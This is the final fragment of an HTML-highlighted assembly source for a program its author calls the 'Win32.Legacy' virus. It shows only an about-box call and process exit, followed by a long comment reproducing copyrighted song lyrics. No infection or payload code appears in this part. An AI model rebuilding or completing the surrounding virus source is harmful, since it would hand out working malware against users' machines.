    </span><span class="sc5">pushs</span><span class="sc0">   </span><span class="sc3">"Win32.Legacy.debug#Legacy [debug mode] v1.00"</span><span class="sc0">
    </span><span class="sc9">ELSE</span><span class="sc0">
    </span><span class="sc5">pushs</span><span class="sc0">   </span><span class="sc3">"Win32.Legacy#Legacy v1.00"</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ShellAboutA</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">legacy1</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; || Bonus track                                                           ||</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; As this virus is my  favourite one, i will put  here  my favourite  song :)</span><span class="sc0">
</span><span class="sc1">; It's a song from the last album of Blind Guardian (www.blind-guardian.com),</span><span class="sc0">
</span><span class="sc1">; based  in  the book  The  Silmarillion (J.R.R. Tolkien). The  album (called</span><span class="sc0">
</span><span class="sc1">; "Nightfall in  the  Middle-Earth"), is the  most complete (and probably the</span><span class="sc0">
</span><span class="sc1">; best one) of Blind  Guardian. Even the mixers  of the album are very famous</span><span class="sc0">
</span><span class="sc1">; in the  metal world: Flemming Rasmussen (see other B.G. albums as "Imagina-</span><span class="sc0">
</span><span class="sc1">; tions from the other side", also Metallica's "...And Justice For All", etc)</span><span class="sc0">
</span><span class="sc1">; Piet Sielck (some songs of B.G. version's album "The forgotten tales", also</span><span class="sc0">
</span><span class="sc1">; vocalist/producer of his parallel project Iron Savior (albums "Iron Savior"</span><span class="sc0">
</span><span class="sc1">; and "Unification"), and  produced  also other  bands  as GammaRay, etc) and</span><span class="sc0">
</span><span class="sc1">; Charlie Bauerfeind. Well, here comes the song.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - Mirror Mirror -</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Far, far beyond the island</span><span class="sc0">
</span><span class="sc1">; We dwelt the shades of twilight</span><span class="sc0">
</span><span class="sc1">; Through dread and weary days</span><span class="sc0">
</span><span class="sc1">; Through grief and endless pain</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; It lies unknown</span><span class="sc0">
</span><span class="sc1">; The land of mine</span><span class="sc0">
</span><span class="sc1">; A hidden gate</span><span class="sc0">
</span><span class="sc1">; To save us from the shadow fall</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The lord of water spoke</span><span class="sc0">
</span><span class="sc1">; In the silence</span><span class="sc0">
</span><span class="sc1">; Words of wisdom</span><span class="sc0">
</span><span class="sc1">; I've seen the end of all</span><span class="sc0">
</span><span class="sc1">; Be aware, the storm gets closer</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; chorus:</span><span class="sc0">
</span><span class="sc1">; Mirror Mirror on the wall</span><span class="sc0">
</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">True</span><span class="sc0"> </span><span class="sc5">hope</span><span class="sc0"> </span><span class="sc5">lies</span><span class="sc0"> </span><span class="sc5">beyond</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">coast</span><span class="sc0">
</span><span class="sc1">; You're a damned kind can't you see</span><span class="sc0">
</span><span class="sc1">; That the winds will change</span><span class="sc0">
</span><span class="sc1">; Mirror Mirror on the wall</span><span class="sc0">
</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">True</span><span class="sc0"> </span><span class="sc5">hope</span><span class="sc0"> </span><span class="sc5">lies</span><span class="sc0"> </span><span class="sc5">beyond</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">coast</span><span class="sc0">
</span><span class="sc1">; You're a damned kind can't you see</span><span class="sc0">
</span><span class="sc1">; That tomorrow bears insanity</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Gone's the wisdom</span><span class="sc0">
</span><span class="sc1">; Of a thousand years</span><span class="sc0">
</span><span class="sc1">; A world in fire and chains and fear</span><span class="sc0">
</span><span class="sc1">; Leads me to a place so far</span><span class="sc0">
</span><span class="sc1">; Deep down it lies my secret vision</span><span class="sc0">
</span><span class="sc1">; I better keep it safe</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Sall i leave my frinds alone</span><span class="sc0">
</span><span class="sc1">; Hidden in my twilight hall</span><span class="sc0">
</span><span class="sc1">; (I) know the world is lost in fire</span><span class="sc0">
</span><span class="sc1">; Sure there is no way to turn it</span><span class="sc0">
</span><span class="sc1">; Back to the old days</span><span class="sc0">
</span><span class="sc1">; Of bliss and cheerful laughter</span><span class="sc0">
</span><span class="sc1">; We're lost in barren lands</span><span class="sc0">
</span><span class="sc1">; Caught in the running flames</span><span class="sc0">
</span><span class="sc1">; Alone</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; How shall we leave the lost road</span><span class="sc0">
</span><span class="sc1">; Time's getting short so follow me</span><span class="sc0">
</span><span class="sc1">; A leader's task so clearly</span><span class="sc0">
</span><span class="sc1">; To find a path out of the dark</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; (chorus)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Even though</span><span class="sc0">
</span><span class="sc1">; The storm calmed down</span><span class="sc0">
</span><span class="sc1">; The bitter end</span><span class="sc0">
</span><span class="sc1">; Is just a matter of time</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Shall we dare the dragon</span><span class="sc0">
</span><span class="sc1">; Mercyless he's poisoning our hearts</span><span class="sc0">
</span><span class="sc1">; Our hearts</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; How...</span><span class="sc0">
</span><span class="sc1">; (chorus)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ---</span><span class="sc0">
</span><span class="sc1">; Copyright (c) 1998 by Blind Guardian; "Nightfall in the Middle-Earth" album</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">



 
</span></div></body>
</html>
